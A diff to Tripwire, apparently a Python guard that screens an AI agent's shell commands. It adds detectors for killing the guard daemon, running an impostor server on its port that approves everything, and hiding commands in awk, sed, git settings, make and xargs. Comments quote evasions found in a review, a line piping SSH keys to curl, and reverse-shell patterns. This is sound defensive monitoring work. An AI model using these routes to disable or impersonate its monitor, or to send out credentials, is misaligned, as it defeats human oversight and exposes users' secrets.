@@ -24,6 +24,7 @@ import glob
 import gzip
 import os
 import re
+import sys
 import shlex
 import unicodedata
 from dataclasses import dataclass, field
@@ -159,7 +160,9 @@ SECRET_VAR = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*(?:SECRET|TOKEN|PASSWORD|P
                         r"ACCESS_KEY|CREDENTIALS?)[A-Za-z0-9_]*)\}?")
 GUARD_RE = re.compile(r"(?:^|[\s/~\"'=:}])\.tripwire\b|\.claude/settings[\w.-]*\.json")
 KILL_GUARD_RE = re.compile(r"\b(pkill|killall|kill)\b[^;&|\n]*\b(tripwire|7777)\b|\b(lsof|fuser)\b[^;&\n]*\b7777\b[^;&\n]*\bkill\b|"
-                           r"\buninstall\b[^;&|\n]*\btripwire\b|\blaunchctl\s+(unload|bootout|remove|disable)\b[^;&|\n]*tripwire", re.I)
+                           r"\buninstall\b[^;&|\n]*\btripwire\b|\blaunchctl\s+(unload|bootout|remove|disable|stop|kill|kickstart)\b[^;&|\n]*tripwire|"
+                           r"\b(systemctl|service|sv|rc-service)\b[^;&|\n]*\b(stop|kill|disable|mask|restart|reload)\b[^;&|\n]*tripwire|"
+                           r"\b(systemctl|service)\b[^;&|\n]*tripwire[^;&|\n]*\b(stop|kill|restart)\b", re.I)
 FORK_BOMB = re.compile(r"(?<![\w:])([\w:]{1,64})\s*\(\s*\)\s*\{[^}]*\1\s*\|\s*\1\s*&|\bwhile\s*(?:\(\s*1\s*\)|true|:)\s*[;{]?\s*(?:do)?\s*\{?[^}]*\bfork\b")
 DEV_TCP = re.compile(r"/dev/(tcp|udp)/[^\s;|&)]+")
 REV_SHELL_HINT = re.compile(r"\b(?:ba|z|k|da)?sh\b[^|;&]*\s-i\b|0>&1|>&\s*/dev/tcp|<&\s*\d|\bexec\s+\d*<>")
@@ -455,6 +458,125 @@ CRED_ARG_OK = {"ls", "stat", "du", "chmod", "chown", "chgrp", "mkdir", "touch", 
                "nc", "ncat", "netcat", "socat", "telnet", "mail", "mailx", "sendmail", "mutt", "gh", "http", "https",
                "xh", "dd", "keychain", "security", "op", "vault", "direnv", "dotenv", "pass", "age", "sops"} | SHELLS | INTERPS
 GUARD_PORTS: set[int] = {7777, int(os.environ.get("TRIPWIRE_PORT") or 7777)}  # Engine.set_guard_port adds the live one
+
+# Review 5: `pkill -f serve`, `killall Python`, `pgrep -f trip | xargs kill` stopped the daemon, and a 7-line server
+# on its port answered "allow". A kill is judged by whether its pattern or PIDs could reach the daemon's real
+# process: its PID (Engine.set_guard_process), its command line and its process names, tested the way pkill,
+# killall and grep would test them.
+GUARD_PIDS: set[int] = set()
+GUARD_EXTRA_CMDLINES: list[str] = []
+
+
+def _guard_cmdlines() -> list[str]:
+    exe = sys.executable or "python3"
+    out = list(GUARD_EXTRA_CMDLINES)
+    for p in sorted(GUARD_PORTS):
+        out += [f"{exe} {os.path.dirname(exe)}/tripwire serve --port {p} --link-fd 3",
+                f"/Library/Frameworks/Python.framework/Versions/3.12/Resources/Python.app/Contents/MacOS/Python "
+                f"-m tripwire serve --port {p}",
+                f"uv run tripwire serve --port {p}"]
+    return out
+
+
+def _guard_proc_names() -> list[str]:
+    v = sys.version_info
+    return ["python", "python3", f"python3.{v.minor}", "Python", "tripwire", "uv"]
+
+
+_NESTED_QUANT = re.compile(r"[*+}?]\)?[*+{]|\)[*+{]")
+
+
+def _pattern_hits_guard(pat: str, full: bool = True, icase: bool = False, exact: bool = False,
+                        fixed: bool = False) -> bool:
+    """Would this pkill/pgrep/grep pattern match the Tripwire daemon? `full` = against its command line (pkill -f,
+    grep on ps output), else against its process names. Odd regexes that could hang count as a hit."""
+    pat = (pat or "")[:200]
+    if not pat:
+        return False
+    targets = _guard_cmdlines() if full else _guard_proc_names()
+    if fixed:
+        return any((pat.lower() in t.lower()) if icase else (pat in t) for t in targets)
+    if _NESTED_QUANT.search(pat):
+        return True
+    try:
+        rx = re.compile(pat, re.I if icase else 0)
+    except re.error:
+        return any(pat.lower() in t.lower() for t in targets)
+    if exact:
+        return any(rx.fullmatch(t) for t in targets)
+    return any(rx.search(t) for t in targets)
+
+
+def _pattern_hits_guard_one(pat: str, target: str, icase: bool) -> bool:
+    pat = (pat or "")[:200]
+    if _NESTED_QUANT.search(pat):
+        return True
+    try:
+        return bool(re.search(pat, target, re.I if icase else 0))
+    except re.error:
+        return pat.lower() in target.lower()
+
+
+# Settings and environment variables whose value a tool runs as a shell command.
+GIT_EXEC_KEYS = re.compile(r"^(?:core\.(?:pager|sshcommand|editor|fsmonitor|askpass)|sequence\.editor|diff\.external|"
+                           r"pager\.[\w-]{1,64}|gpg(?:\.\w{1,16})?\.program|interactive\.difffilter|"
+                           r"filter\.[^.]{1,64}\.(?:clean|smudge|process)|diff\.[^.]{1,64}\.(?:textconv|command)|"
+                           r"merge\.[^.]{1,64}\.driver|uploadpack\.packobjectshook|core\.hookspath_never)$")
+EXEC_ENV = {"GIT_SSH_COMMAND", "GIT_SSH", "GIT_PAGER", "GIT_EDITOR", "GIT_SEQUENCE_EDITOR", "GIT_EXTERNAL_DIFF",
+            "GIT_ASKPASS", "SSH_ASKPASS", "PAGER", "MANPAGER", "EDITOR", "VISUAL", "LESSOPEN", "LESSCLOSE",
+            "BASH_ENV", "PROMPT_COMMAND", "SUDO_ASKPASS", "RSYNC_RSH", "CVS_RSH"}
+
+
+SERVE_PORT_RE = re.compile(r"(?:\bhttp\.server|\bSimpleHTTPServer|--port[= ]|--listen[= ]|TCP[46]?-LISTEN:|"
+                           r"\b(?:nc|ncat|netcat)\b[^|;&\n]{0,60}?-\w{0,4}l\w{0,4}\b[^|;&\n]{0,60}?|\bphp\s{1,4}-S\s{1,4}[\w.]{0,64}:)"
+                           r"\s{0,4}(\d{2,5})\b")
+SERVER_NAMES = {"uvicorn", "gunicorn", "hypercorn", "daphne", "flask", "http-server", "serve", "live-server", "vite",
+                "next", "nuxt", "astro", "webpack-dev-server", "caddy", "busybox", "httpd", "nc", "ncat", "netcat",
+                "socat", "ruby", "rails", "jekyll", "hugo", "mkdocs", "jupyter", "streamlit", "gradio", "deno", "bun",
+                "node", "npx", "python", "php", "sanic", "fastapi", "waitress-serve", "twistd", "miniserve", "simple-http-server"}
+
+
+def _port_value(w: str) -> int | None:
+    """A port word as a number: '7777', "'77''77'", '$((7000+777))'. None when it can't be worked out."""
+    w = re.sub(r"['\"\\]", "", w or "").strip()
+    w = w.rsplit(":", 1)[-1] if re.search(r":\d|:\$", w) else w
+    if w.isdigit():
+        return int(w)
+    m = re.fullmatch(r"\$\(\(\s{0,4}(\d{1,6})\s{0,4}([+*-])\s{0,4}(\d{1,6})\s{0,4}\)\)", w)
+    if m:
+        a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
+        return a + b if op == "+" else a * b if op == "*" else a - b
+    m = re.fullmatch(r"\$\{\w{1,64}:-(\d{1,6})\}", w)
+    return int(m.group(1)) if m else None
+
+
+SERVER_CODE = re.compile(r"HTTPServer|TCPServer|UDPServer|socketserver|\.bind\s{0,4}\(|\.listen\s{0,4}\(|createServer|"
+                         r"serve_forever|\bapp\.run\s{0,4}\(|uvicorn\.run|run_app|Deno\.serve|Bun\.serve|"
+                         r"start_server|\bserve\s{0,4}\(|WEBrick|TCPServer\.new|\bphp\s+-S")
+_PORT_CTX = re.compile(r"HTTPServer|TCPServer|\bbind|\blisten|createServer|\bserve|\brun\b|\bport\b|\bPORT\b|"
+                       r"\bhost\b|127\.0\.0\.1|localhost|0\.0\.0\.0|['\"]{2}")
+KILL_CODE = re.compile(r"\bos\.kill(?:pg)?\s{0,4}\(|\.kill\s{0,4}\(|\.terminate\s{0,4}\(|send_signal|signal\.SIG(?:KILL|TERM|INT)|"
+                       r"\bprocess\.kill\b|\bpkill\b|\bkillall\b|\bkill\s+-|Process\.kill|\bkill\s*\(")
+PROC_SEARCH_CODE = re.compile(r"\bpgrep\b|\bpidof\b|\blsof\b|\bfuser\b|process_iter|psutil|/proc\b|['\"]ps['\"]|\bps\s+-?\w|"
+                              r"\bps\s+aux")
+
+
+def _code_ports(code: str, built: list[str]) -> set[int]:
+    """Port numbers a program's code can bind: literal numbers near a server or port word, strings built from
+    pieces ('77'+'77'), and simple sums (7000+777)."""
+    out: set[int] = set()
+    for m in _PORT_CTX.finditer(code[:MAX_LEN]):
+        win = code[m.start(): m.end() + 160]
+        for x in re.findall(r"(?<![\w.])(\d{2,5})(?![\w.])", win):
+            out.add(int(x))
+        for a, op, b in re.findall(r"(?<![\w.])(\d{1,5})\s{0,4}([+*])\s{0,4}(\d{1,5})(?![\w.])", win):
+            out.add(int(a) + int(b) if op == "+" else int(a) * int(b))
+        for pieces in re.findall(r"""((?:['"]\d{1,5}['"]\s{0,4}\+?\s{0,4}){2,6})""", win):
+            out.add(int("".join(re.findall(r"\d+", pieces))[:6]))
+    for b in built:
+        if re.fullmatch(r"\d{2,5}", b.strip()):
+            out.add(int(b.strip()))
+    return out
 
 
 def _home_refs() -> list[str]:
@@ -934,13 +1056,71 @@ def _add_redirect(c: Cmd, p, text: str, out: list) -> None:
     c.redirects.append((typ, target))
 
 
+def _dq_keeps_backslash(raw: str) -> bool:
+    """A backslash bash keeps: inside double quotes, before a character it does not escape. Linear scan."""
+    q, i = None, 0
+    while i < len(raw):
+        ch = raw[i]
+        if q == "'":
+            q = None if ch == "'" else q
+        elif ch == "\\" and i + 1 < len(raw):
+            if q == '"' and raw[i + 1] not in '$`"\\\n':
+                return True
+            i += 1
+        elif ch in "'\"" and q is None:
+            q = ch
+        elif ch == '"' and q == '"':
+            q = None
+        i += 1
+    return False
+
+
+def _dq_fix(raw: str) -> str | None:
+    """bashlex drops every backslash inside double quotes, but bash keeps it unless it escapes $ ` " \\ or a newline:
+    `python3 -c "...write('\\nalias git=\\'curl ...\\'')"` reached the code folder as broken Python and the rc-file
+    write went unseen (review 5). Re-unquote such words the way bash does. None = bashlex's word is right."""
+    if len(raw) > MAX_LEN or not _dq_keeps_backslash(raw) or "$(" in raw or "`" in raw or "$'" in raw:
+        return None
+    out: list[str] = []
+    i, n = 0, len(raw)
+    while i < n:
+        ch = raw[i]
+        if ch == "'":
+            j = raw.find("'", i + 1)
+            if j < 0:
+                return None
+            out.append(raw[i + 1:j])
+            i = j + 1
+        elif ch == '"':
+            i += 1
+            while i < n and raw[i] != '"':
+                if raw[i] == "\\" and i + 1 < n:
+                    nx = raw[i + 1]
+                    out.append(nx if nx in '$`"\\' else "" if nx == "\n" else "\\" + nx)
+                    i += 2
+                    continue
+                out.append(raw[i])
+                i += 1
+            if i >= n:
+                return None
+            i += 1
+        elif ch == "\\" and i + 1 < n:
+            out.append(raw[i + 1] if raw[i + 1] != "\n" else "")
+            i += 2
+        else:
+            out.append(ch)
+            i += 1
+    return "".join(out)
+
+
 def _mk_cmd(node, text: str, out: list) -> Cmd:
     c = Cmd(words=[], raw=text[node.pos[0]:node.pos[1]])
     for p in node.parts:
         if p.kind == "word":
             idx = len(c.words)
-            c.words.append(p.word)
-            c.raw_words.append(text[p.pos[0]:p.pos[1]])
+            rw = text[p.pos[0]:p.pos[1]]
+            c.words.append(_dq_fix(rw) or p.word)
+            c.raw_words.append(rw)
             for kind, inner in _subs_of(p, text):
                 c.subs.append((kind, idx, inner))
         elif p.kind == "assignment":
@@ -1638,6 +1818,8 @@ class _Analyzer:
         self.written_paths: list[str] = []  # every file this command writes, whatever writes it
         self.official_url_hosts: set[str] = set()  # shared hosts (raw.githubusercontent.com) seen only with official installer paths
         self.packages: list[tuple[str, str, str]] = []  # (package, tool, raw command) installed or run from a registry
+        self.remotes: list[str] = []  # git remote URLs this command points at or pushes to
+        self.pid_vars: dict[str, list] = {}  # PID=$(pgrep ...): the commands that produced a variable, for `kill $PID`
 
     # ---- bookkeeping ----
     def add(self, rule: str, sev: int, cat: str, msg: str, ev: str | None = None) -> None:
@@ -1773,6 +1955,12 @@ class _Analyzer:
                      lambda m: str(eval(f"{int(m.group(1))}{m.group(2)}{int(m.group(3))}")),  # noqa: S307 - two ints
                      re.sub(r"['\"\\]", "", cmd))
         m = KILL_GUARD_RE.search(cmd) or KILL_GUARD_RE.search(unq)
+        for pm in SERVE_PORT_RE.finditer(unq[:MAX_LEN]):
+            if int(pm.group(1)) in GUARD_PORTS:  # `$((7000+777))` is folded only in `unq`
+                self.add("shell.guard_impostor", CRITICAL, "scope",
+                         f"Starts a server on port {pm.group(1)}, Tripwire's own port. Something else answering there "
+                         "could pretend to be Tripwire and approve everything.", pm.group(0))
+                break
         if m:
             self.add("shell.guard_tamper", CRITICAL, "scope",
                      "Tries to switch off Tripwire, the guard watching this agent.", m.group(0))
@@ -1846,6 +2034,9 @@ class _Analyzer:
             blob = " ".join(i.c.raw + " " + (i.c.heredoc or "") + " " + (i.c.herestring or "") for i in infos)
             self.sql(blob)
         for j, inf in enumerate(infos):
+            self.kill_guard(inf, infos[:j])
+            if j > 0 and "xargs" in inf.wrappers and inf.name and inf.name not in ("kill", "pkill", "killall"):
+                self.xargs_fill(infos[j - 1], inf, depth)
             up: set[str] = set().union(*(i.traits for i in infos[:j])) if j else set()
             up_hosts = sorted(t[5:] for t in up if t.startswith("host="))
             ev = " | ".join(i.c.raw for i in infos[: j + 1])
@@ -1946,6 +2137,8 @@ class _Analyzer:
             sub_info.append((kind, idx, inner, self.script(inner, depth + 1)))
         for name, val in c.assigns:
             self.assign(name, val, c)
+        for name, inner in c.assign_subs.items():
+            self.pid_vars[name] = [x for scr in inner for pipe in scr for x in pipe]
         words = [self.expand(w) for w in c.words]
         for _, _, _, t in sub_info:
             inf.traits |= t & {"secret_read", "env_dump", "download_stdout", "decode", "cred_out"}
@@ -2066,6 +2259,415 @@ class _Analyzer:
                 self.add("shell.sudo", MEDIUM, "privilege",
                          f"Runs '{inf.name}' with administrator (root) power.", c.raw)
         return inf
+
+    # ---- review 5: commands that run commands ----
+    def inner(self, text: str | None, inf: Info, depth: int) -> None:
+        """Judge a command that another program will run (find -exec, awk system(), git's pager...) like `bash -c`:
+        same workspace, same session, and what it reads or where it sends flows back into this command."""
+        if not text or not text.strip():
+            return
+        if depth + 1 > MAX_DEPTH:
+            self.text(text, depth + 1)
+            return
+        t = self.text(text, depth + 1)
+        inf.traits |= t & {"secret_read", "env_dump", "download_stdout", "decode", "cred_out", "net"}
+        inf.traits |= {x for x in t if x.startswith(("host=", "credfor="))}
+
+    def inner_words(self, words: list[str], inf: Info, depth: int) -> None:
+        """Same, for a command given as separate words (find -exec, parallel): no re-quoting, so `~` and globs stay."""
+        if not words or depth + 1 > MAX_DEPTH:
+            return
+        c = Cmd(words=list(words), raw=" ".join(words))
+        c.raw_words = list(words)
+        sub = self.cmd(c, depth + 1)
+        self.pipeline([sub], depth + 1)
+        inf.traits |= sub.traits & {"secret_read", "env_dump", "download_stdout", "decode", "cred_out", "net"}
+        if sub.host:
+            inf.traits.add("host=" + sub.host)
+            inf.host = inf.host or sub.host
+
+    @staticmethod
+    def _awk_program(a: list[str]) -> tuple[str | None, list[str]]:
+        """awk's program text and its input files."""
+        i, prog = 0, None
+        while i < len(a):
+            x = a[i]
+            if x in ("-F", "-v", "-f", "--field-separator", "--assign", "--file", "-i", "--include", "-l", "--load"):
+                if x in ("-f", "--file"):
+                    prog = ""
+                i += 2
+                continue
+            if x in ("-e", "--source") and i + 1 < len(a):
+                prog = (prog or "") + "\n" + a[i + 1]
+                i += 2
+                continue
+            if x.startswith("-") and len(x) > 1 and x != "--":
+                i += 1
+                continue
+            if x == "--":
+                i += 1
+                continue
+            break
+        if prog is None and i < len(a):
+            prog, i = a[i], i + 1
+        return prog, a[i:]
+
+    @staticmethod
+    def _awk_fold(expr: str, filler: str) -> str:
+        """An awk string expression as text: literals kept, ENVIRON["X"] -> $X, anything else -> `filler`."""
+        out = []
+        for m in re.finditer(r'"((?:[^"\\]|\\.){0,2000})"|ENVIRON\s{0,4}\[\s{0,4}"(\w{1,64})"\s{0,4}\]|([A-Za-z_]\w{0,63})(?:\s{0,4}\[[^\]]{0,64}\])?|\$\d{1,3}', expr):
+            if m.group(1) is not None:
+                out.append(m.group(1).replace('\\"', '"').replace("\\\\", "\\").replace("\\n", "\n").replace("\\t", "\t"))
+            elif m.group(2):
+                out.append("$" + m.group(2))
+            elif m.group(3) and m.group(3) in ("getline", "close", "in"):
+                continue
+            else:
+                out.append(filler)
+        return "".join(out)
+
+    def awk(self, inf: Info, depth: int) -> None:
+        prog, files = self._awk_program(inf.args)
+        if not prog:
+            return
+        prog = prog[:MAX_LEN]
+
+        def call_args(name: str) -> list[str]:
+            res = []
+            for m in re.finditer(r"\b" + name + r"\s{0,4}\(", prog):
+                k = _match_paren(prog, m.end() - 1)
+                if k > 0:
+                    res.append(prog[m.end(): k])
+            return res
+
+        reads = []  # getline < file
+        for m in re.finditer(r"getline\b[^<\n;|]{0,64}<\s{0,4}", prog):
+            rest = prog[m.end():]
+            if rest.startswith("("):
+                k = _match_paren(rest, 0)
+                expr = rest[1:k] if k > 0 else rest[1:200]
+            else:
+                expr = re.match(r'(?:"(?:[^"\\]|\\.){0,500}"|[\w\[\]"]{1,200})', rest).group(0) if re.match(r'["\w]', rest) else ""
+            reads.append(self._awk_fold(expr, "X"))
+        cmd_reads = [self._awk_fold(m.group(1), "X") for m in
+                     re.finditer(r'((?:"(?:[^"\\]|\\.){0,2000}"\s{0,4}|[A-Za-z_]\w{0,63}\s{0,4}){1,12})\|\s{0,4}getline', prog)]
+        secret = next((r for r in reads if _is_secret(self.expand_path(self.expand(r)))), None)
+        for cr in cmd_reads:
+            self.inner(cr, inf, depth)
+            if secret is None:
+                m = re.search(r"(?:^|\s)((?:~|/|\$HOME)\S*)", cr)
+                if m and _is_secret(self.expand_path(self.expand(m.group(1)))):
+                    secret = m.group(1)
+        for r in reads:
+            if r and r != "X":
+                self.inner_words(["cat", r], inf, depth)
+        filler = f"$(cat {secret})" if secret else "X"
+        runs = [self._awk_fold(x, filler) for x in call_args("system")]
+        runs += [self._awk_fold(m.group(1), filler) for m in
+                 re.finditer(r'(?<!\|)\|&?(?!\|)\s{0,4}((?:"(?:[^"\\]|\\.){0,2000}"\s{0,4}|[A-Za-z_]\w{0,63}\s{0,4}){1,12})', prog)
+                 if not m.group(1).lstrip().startswith("getline")]
+        for r in runs:
+            words = r.split()
+            if words and _base(words[0]) in SHELLS and len(words) == 1:
+                self.add("shell.awk_shell", MEDIUM, "obfuscation",
+                         "Feeds text to a shell through awk, so it runs commands that can't be checked first.", inf.c.raw)
+                for f in files[:4]:
+                    self.runs.append(("as:sh", f))
+                continue
+            self.inner(r, inf, depth)
+
+    def nested_exec(self, inf: Info, depth: int) -> None:
+        """Programs that run a command given to them as text: look inside like `bash -c`."""
+        n, a, c = inf.name, inf.args, inf.c
+        # Env vars that tools run as commands (GIT_SSH_COMMAND=... git fetch, export GIT_PAGER=...).
+        envs = list(c.assigns) + [tuple(w.split("=", 1)) for w in c.words if re.match(r"^[A-Z_]{2,32}=", w)]
+        for name, val in envs:
+            if name in EXEC_ENV and val:
+                self.inner(val.lstrip("|!"), inf, depth)
+        if n in ("awk", "gawk", "mawk", "nawk"):
+            self.awk(inf, depth)
+        elif n == "git":
+            i = 0
+            while i < len(a) and a[i].startswith("-"):
+                if a[i] == "-c" and i + 1 < len(a):
+                    self.git_exec_setting(a[i + 1], inf, depth)
+                    i += 2
+                    continue
+                if a[i].startswith("-c") and "=" in a[i]:
+                    self.git_exec_setting(a[i][2:], inf, depth)
+                i += 2 if a[i] in ("-C", "--git-dir", "--work-tree", "--namespace", "--config-env") else 1
+            if i < len(a) and a[i] == "config":
+                pos = [x for x in a[i + 1:] if not x.startswith("-")]
+                if len(pos) >= 2:
+                    self.git_exec_setting(pos[0] + "=" + pos[1], inf, depth)
+        elif n in ("make", "gmake", "bmake"):
+            texts = []
+            stdin_mk = any(x in ("-f-", "--file=-", "--makefile=-", "-f/dev/stdin", "--file=/dev/stdin") for x in a) or \
+                any(x in ("-f", "--file", "--makefile") and k + 1 < len(a) and a[k + 1] in ("-", "/dev/stdin")
+                    for k, x in enumerate(a))
+            if stdin_mk:
+                texts.append(c.herestring or c.heredoc or "")
+                if not (c.herestring or c.heredoc):
+                    self.add("shell.make_stdin", MEDIUM, "obfuscation",
+                             "Runs a Makefile read from its input, so its commands can't be checked first.", c.raw)
+            for k, x in enumerate(a):
+                if x.startswith("--eval="):
+                    texts.append(x[7:])
+                elif x in ("--eval", "-E") and k + 1 < len(a):
+                    texts.append(a[k + 1])
+            for t in texts:
+                for line in t.replace("\\\n", " ").split("\n"):
+                    m = re.match(r"^\t[@+-]{0,3}(.*)$", line) or re.match(r"^[^#=\t][^=:]{0,200}::?[^=]*?;\s{0,4}[@+-]{0,3}(.*)$", line)
+                    if m and m.group(1).strip():
+                        self.inner(m.group(1).replace("$$", "$"), inf, depth)
+        elif n in ("sed", "gsed"):
+            opts, pos = _parse_opts(a, "efl", {"--expression", "--file", "--line-length"})
+            scripts = [v for f, v in opts if f in ("-e", "--expression")] or pos[:1]
+            for sc in scripts:
+                for part in re.split(r"[;\n]", sc):
+                    m = re.match(r"^\s{0,8}(?:\d{1,9}|\$|/(?:[^/\\]|\\.){0,200}/)?(?:,(?:\d{1,9}|\$|/(?:[^/\\]|\\.){0,200}/))?\s{0,4}!?\s{0,4}e\s(.+)$", part)
+                    if m:
+                        self.inner(m.group(1), inf, depth)
+                    elif re.match(r"^\s{0,8}(?:\d{1,9}|\$)?\s{0,4}e\s{0,4}$", part) or \
+                            re.match(r"^\s{0,8}s(.)(?:(?!\1).|\\.){0,500}\1(?:(?!\1).|\\.){0,500}\1[gpiImM0-9w]{0,8}e", part):
+                        self.add("shell.sed_exec", MEDIUM, "obfuscation",
+                                 "Uses sed to run text from the file as a command, which can't be checked first.", c.raw)
+        elif n in ("vim", "vi", "nvim", "ex", "view", "gvim", "mvim", "less", "more", "man", "nano"):
+            cmds = [a[k + 1] for k, x in enumerate(a[:-1]) if x in ("-c", "--cmd")] + [x[1:] for x in a if x.startswith("+")]
+            for cm in cmds:
+                cm = cm.lstrip(":")
+                if cm.startswith("!"):
+                    self.inner(cm[1:], inf, depth)
+                for m in re.finditer(r"""system\s{0,4}\(\s{0,4}(['"])(.{1,2000}?)\1""", cm):
+                    self.inner(m.group(2), inf, depth)
+        elif n in ("parallel", "sem"):
+            j = 0
+            while j < len(a) and a[j].startswith("-") and a[j] not in (":::", "::::"):
+                j += 2 if a[j] in ("-j", "-S", "--jobs", "-P", "--sshlogin", "-I", "--delay", "--timeout", "-N", "-n",
+                                    "--joblog", "--results", "--tmpdir", "-a", "--arg-file", "--colsep", "-d") else 1
+            if ":::" in a[j:]:
+                k = a.index(":::", j)
+                tmpl = a[j:k]
+                vals = [x for x in a[k + 1:] if x not in (":::", "::::")][:4]
+                for v in vals:
+                    if tmpl:
+                        words = [re.sub(r"\{[./#%]*\}", v, w) for w in tmpl]
+                        if not any(re.search(r"\{[./#%]*\}", w) for w in tmpl):
+                            words.append(v)
+                        self.inner_words(words, inf, depth)
+                    else:
+                        self.inner(v, inf, depth)
+            else:
+                tmpl = a[j:]
+                if tmpl:
+                    self.inner_words([re.sub(r"\{[./#%]*\}", "FILE", w) for w in tmpl], inf, depth)
+        elif n == "script":
+            k = next((k for k, x in enumerate(a) if x in ("-c", "--command")), None)
+            if k is not None and k + 1 < len(a):
+                self.inner(a[k + 1], inf, depth)
+            else:  # macOS: script [-adFkqr] [-t time] [file [command ...]]
+                j = 0
+                while j < len(a) and a[j].startswith("-"):
+                    j += 2 if a[j] == "-t" else 1
+                if j + 1 < len(a):
+                    self.inner_words(a[j + 1:], inf, depth)
+        elif n in ("flock", "setsid", "chroot", "unshare", "firejail", "strace", "ltrace", "dtruss", "systemd-run",
+                   "ssh-agent", "dbus-run-session", "xvfb-run", "catchsegv", "valgrind", "time", "faketime"):
+            pos = [x for x in a if not x.startswith("-")]
+            if n in ("flock", "chroot", "faketime") and pos:
+                pos = pos[1:]
+            if pos and not (n == "flock" and a and "-c" in a):
+                self.inner_words(pos, inf, depth)
+            if n == "flock" and "-c" in a and a.index("-c") + 1 < len(a):
+                self.inner(a[a.index("-c") + 1], inf, depth)
+
+    def xargs_fill(self, prev: Info, inf: Info, depth: int) -> None:
+        """`ls ~/.ssh/id_* | xargs -I% curl -F f=@% host`: judge the command with what the list step names."""
+        if prev.name in ("ls", "echo", "printf"):
+            listed = [x for x in prev.args if not x.startswith("-")]
+        elif prev.name == "find":
+            ex = prev.args
+            names = [ex[q + 1] for q, y in enumerate(ex[:-1]) if y in ("-name", "-iname")]
+            listed = [r.rstrip("/") + "/" + (names[0] if names else "FILE") for r in (prev.find_roots or ["."])]
+        else:
+            return
+        if not listed:
+            return
+        words = list(inf.c.words)
+        rep = None
+        for k, w in enumerate(words):
+            if w == "-I" and k + 1 < len(words):
+                rep = words[k + 1]
+            elif w.startswith("-I") and len(w) > 2:
+                rep = w[2:]
+            elif w in ("-i", "--replace") or w.startswith("--replace="):
+                rep = w.split("=", 1)[1] if "=" in w else "{}"
+        cmd = [inf.exec_path] + inf.args
+        for v in listed[:3]:
+            filled = [w.replace(rep, v) for w in cmd] if rep else cmd + [v]
+            if filled != cmd:
+                self.inner_words(filled, inf, depth)
+
+    def git_exec_setting(self, kv: str, inf: Info, depth: int) -> None:
+        """git settings whose value git runs as a command (core.pager, core.sshCommand, alias.x=!cmd, ...)."""
+        key, _, val = kv.partition("=")
+        k = key.lower()
+        if not val:
+            return
+        if GIT_EXEC_KEYS.search(k) or (k.startswith(("alias.", "credential.")) and val.lstrip().startswith("!")):
+            self.inner(val.lstrip().lstrip("!"), inf, depth)
+
+    # ---- review 5: stopping or replacing the daemon ----
+    def _producer_hits(self, cmds: list) -> str | None:
+        """Commands whose output feeds `kill` (`kill $(...)`, `... | xargs kill`): could the PIDs they print include
+        the daemon's? Filters (grep, awk /re/) must all pass on one daemon command line."""
+        filters: list[tuple[str, bool, bool, bool]] = []  # (pattern, icase, inverted, fixed)
+        lists_all = False
+        for c in cmds:
+            words, _ = _unwrap([self.expand(w) for w in c.words])
+            if not words:
+                continue
+            n, a = _base(words[0]), words[1:]
+            if n in ("pgrep", "pkill"):
+                hit = self._pkill_hits(a)
+                if hit:
+                    return hit
+            elif n in ("pidof", "killall"):
+                if any(not x.startswith("-") and _pattern_hits_guard(x, full=False, icase=True, exact=True) for x in a):
+                    return c.raw
+            elif n in ("lsof", "fuser"):
+                for w in c.raw_words[1:] + a:
+                    if re.search(r"(?:^|[:@=])(?:tcp:|udp:)?\$|\d/tcp|:\d|^\d{2,5}$|^-i\S*\d", w):
+                        pv = _port_value(re.sub(r"/(?:tcp|udp)$", "", w.split("@")[-1]))
+                        if pv is None and "$" in w or pv in GUARD_PORTS:
+                            return c.raw
+            elif n in ("grep", "egrep", "fgrep", "rg", "ag"):
+                opts, pos = _parse_opts(a, "eABCmf", {"--regexp", "--max-count"})
+                fl = {f for f, _ in opts}
+                pats = [v for f, v in opts if f in ("-e", "--regexp")] or pos[:1]
+                for pt in pats:
+                    filters.append((pt, "-i" in fl or "--ignore-case" in fl, "-v" in fl, n == "fgrep" or "-F" in fl))
+            elif n in ("awk", "gawk", "mawk", "nawk"):
+                prog = self._awk_program(a)[0] or ""
+                for rx in re.findall(r"/((?:[^/\\\n]|\\.){1,200})/", prog):
+                    filters.append((rx, False, False, False))
+            elif n == "ps":
+                lists_all = True
+                for f, v in _parse_opts(a, "CopUuGgt", set())[0]:
+                    if f == "-C" and _pattern_hits_guard(v, full=False, exact=True):
+                        return c.raw
+        if filters:
+            for t in _guard_cmdlines():
+                ok = True
+                for pt, ic, inv, fx in filters:
+                    m = (pt.lower() in t.lower() if ic else pt in t) if fx else _pattern_hits_guard_one(pt, t, ic)
+                    if m == inv:
+                        ok = False
+                        break
+                if ok:
+                    return " | ".join(c.raw for c in cmds)
+            return None
+        return " | ".join(c.raw for c in cmds) if lists_all else None
+
+    def _pkill_hits(self, a: list[str]) -> str | None:
+        opts, pos = _parse_opts(a, "gGPstuUFJLc", {"--signal", "--parent", "--euid", "--uid", "--pidfile", "--session"})
+        fl = {f for f, _ in opts}
+        if not pos:
+            return "every process you own" if fl & {"-u", "-U", "-G", "-g", "-s", "--euid", "--uid"} else None
+        if _pattern_hits_guard(pos[0], full="-f" in fl or "--full" in fl, icase="-i" in fl or "--ignore-case" in fl,
+                               exact="-x" in fl or "--exact" in fl):
+            return pos[0]
+        return None
+
+    def kill_guard(self, inf: Info, upstream: list) -> None:
+        """Could this stop the Tripwire daemon? pkill/killall/kill by pattern, by PID, by port lookup, or everything."""
+        n, a, c = inf.name, inf.args, inf.c
+        hit = None
+        if n in ("pkill", "pgrep") and n == "pkill":
+            hit = self._pkill_hits(a)
+        elif n in ("killall", "skill"):
+            opts, pos = _parse_opts(a, "utcs", {"--user", "--signal"})
+            fl = {f for f, _ in opts}
+            regex = "-m" in fl or "-r" in fl or "--regexp" in fl
+            names = [x for x in pos if not re.fullmatch(r"\d+", x)]
+            if not names and fl & {"-u", "--user"}:
+                hit = "every process you own"
+            for x in names:
+                if _pattern_hits_guard(x, full=False, icase=True, exact=not regex):
+                    hit = x
+                    break
+        elif n == "killall5":
+            hit = "every process"
+        elif n == "kill":
+            i = 0
+            if i < len(a) and a[i] in ("-l", "-L"):
+                return
+            if i < len(a) and a[i] in ("-s", "-n", "--signal"):
+                i += 2
+            elif i < len(a) and a[i].startswith("-") and a[i] != "--" and not re.fullmatch(r"-1", a[i]) or \
+                    i < len(a) and a[i] == "-1" and len(a) > 1:
+                i += 1
+            if i < len(a) and a[i] == "--":
+                i += 1
+            for k, w in enumerate(a[i:]):
+                if w == "-1":
+                    hit = "every process you own (kill -1)"
